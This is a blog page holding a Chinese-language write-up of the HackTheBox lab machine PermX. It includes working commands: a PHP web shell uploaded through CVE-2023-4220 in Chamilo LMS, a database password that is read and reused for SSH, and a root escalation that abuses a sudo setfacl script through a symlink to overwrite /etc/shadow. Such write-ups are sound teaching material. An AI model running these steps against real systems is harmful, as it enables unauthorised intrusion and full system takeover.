@@ -1,0 +1,337 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB PermX | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="PermX (Linux · Easy)CVE-2023-4220 + sudo提权(符号链接)
+枚举nmap123456789101112131415nmap -sC -sV -sT -T4 10.10.11.23Nmap scan report for permx.htb (10.10.11.23)Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)80/tcp open  http    Apache httpd 2.4.52|_http-title: eLEARNING|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ffuf12345678hosts绑定: 10.10.11.23	permx.htbffuf -c -u &amp;#x27;http://permx.htb&amp;#x27; -H &amp;#x27;host: FUZZ.permx.htb&amp;#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302 -mc all__________________________________________________www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1716ms]lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 120ms]lms绑一下hosts
+
+dirsearch123dirsearch -u http://permx.htbNothingdirsearch -u http://lms.permx.htb
+
+permx.htb"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB PermX"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB PermX</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="PermX-Linux-·-Easy"><a href="#PermX-Linux-·-Easy" class="headerlink" title="PermX (Linux · Easy)"></a>PermX (Linux · Easy)</h1><p>CVE-2023-4220 + sudo提权(符号链接)</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -sT -T4 10.10.11.23</span><br><span class="line"></span><br><span class="line">Nmap scan report for permx.htb (10.10.11.23)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)</span><br><span class="line">|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: eLEARNING</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hosts绑定: 10.10.11.23	permx.htb</span><br><span class="line"></span><br><span class="line">ffuf -c -u &#x27;http://permx.htb&#x27; -H &#x27;host: FUZZ.permx.htb&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302 -mc all</span><br><span class="line">__________________________________________________</span><br><span class="line">www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1716ms]</span><br><span class="line">lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 120ms]</span><br><span class="line"></span><br><span class="line">lms绑一下hosts</span><br></pre></td></tr></table></figure>
+
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://permx.htb</span><br><span class="line">Nothing</span><br><span class="line">dirsearch -u http://lms.permx.htb</span><br></pre></td></tr></table></figure>
+
+<p>permx.htb</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722170203735.png" alt="image-20240722170203735"></p>
+<p>lms.permx.htb，<code>Powered by Chamilo © 2024</code>，找到相关漏洞CVE-2023-4220</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722170057063.png" alt="image-20240722170057063"></p>
+<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>lms.permx.htb - CVE-2023-4220</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POC</span></span><br><span class="line">echo &#x27;&lt;?php system(GET_[0]); ?&gt;&#x27; &gt; shell.php</span><br><span class="line">curl -F &#x27;bigUploadFile=@shell.php&#x27; &#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span><br><span class="line"></span><br><span class="line">curl &#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?0=id&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>权限不够，无法读取用户文件</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722172222942.png" alt="image-20240722172222942"></p>
+<p>信息收集后，在&#x2F;app&#x2F;config下找到configuration.php找到数据库相关配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">// Database connection settings.</span><br><span class="line">$_configuration[&#x27;db_host&#x27;] = &#x27;localhost&#x27;;</span><br><span class="line">$_configuration[&#x27;db_port&#x27;] = &#x27;3306&#x27;;</span><br><span class="line">$_configuration[&#x27;main_database&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_user&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_password&#x27;] = &#x27;03F6lY3uXAP2bkW8&#x27;;</span><br><span class="line">// Enable access to database management for platform admins.</span><br><span class="line">$_configuration[&#x27;db_manager_enabled&#x27;] = false;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>连接数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">交互式shell</span><br><span class="line">script /dev/null -c /bin/bash</span><br><span class="line"></span><br><span class="line">mysql -uchamilo -p03F6lY3uXAP2bkW8</span><br><span class="line">MariaDB [(none)]&gt; select username,password from chamilo.user;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722172054155.png" alt="image-20240722172054155"></p>
+<p>没有mtz用户，随便尝试下，ssh(03F6lY3uXAP2bkW8)</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722172456720.png" alt="image-20240722172456720"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722172531611.png" alt="image-20240722172531611"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">三个参数</span></span><br><span class="line">if [ &quot;$#&quot; -ne 3 ]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 user perm file&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">user=&quot;$1&quot;</span><br><span class="line">perm=&quot;$2&quot;</span><br><span class="line">target=&quot;$3&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">限制目录</span></span><br><span class="line">if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Access denied.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> the path is a file</span></span><br><span class="line">if [ ! -f &quot;$target&quot; ]; then</span><br><span class="line">    /usr/bin/echo &quot;Target must be a file.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>符号链接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / s</span><br><span class="line">sudo /opt/acl.sh mtz rwx /home/mtz/s/etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>生成密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 n2ryx</span><br><span class="line"># -6 SHA-512</span><br><span class="line">$6$ztkRSP3WE.Ds7q3e$FrrLxJU6LuU3hcrJkpQNSjoYWbKneWHmENF8qUQiuqZ293dkLTA08Pa946ids5NNggurZgpUiYMHMxmPHqUG7/</span><br><span class="line"></span><br><span class="line">echo &#x27;root:$6$ztkRSP3WE.Ds7q3e$FrrLxJU6LuU3hcrJkpQNSjoYWbKneWHmENF8qUQiuqZ293dkLTA08Pa946ids5NNggurZgpUiYMHMxmPHqUG7/:19871:0:99999:7:::&#x27; &gt; /home/mtz/s/etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240722174241797.png" alt="image-20240722174241797"></p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/07/24/writeup/htb/HTB TwoMillion/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/07/20/writeup/htb/HTB Cap/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-07-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Writeup/">Writeup<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PermX-Linux-%C2%B7-Easy"><span class="toc-article-text">PermX (Linux · Easy)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">枚举</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ffuf"><span class="toc-article-text">ffuf</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#dirsearch"><span class="toc-article-text">dirsearch</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Shell"><span class="toc-article-text">Shell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-article-text">权限提升</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
